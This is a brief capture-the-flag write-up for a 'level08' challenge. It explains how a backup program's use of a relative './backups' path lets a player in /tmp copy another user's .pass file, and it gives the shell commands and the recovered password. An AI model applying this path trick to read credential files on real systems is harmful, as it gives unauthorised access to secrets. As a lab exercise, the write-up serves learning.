The binary does a backup of the file we pass in as a parameter. It concatenates './backups' with the path parameter. \
So the only thing we need to do is create a directory structure matching the path we pass as parameter inside the backups folder. \
As we cannot create files where the binary lives (our home folder), we decided to go to /tmp to do that. \
We can exploit this because it uses relative path to open the files.
```shell
bash$ cd /tmp
bash$ mkdir -p backups/home/users/level09
bash$ ~/level08 /home/users/level09/.pass
bash$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

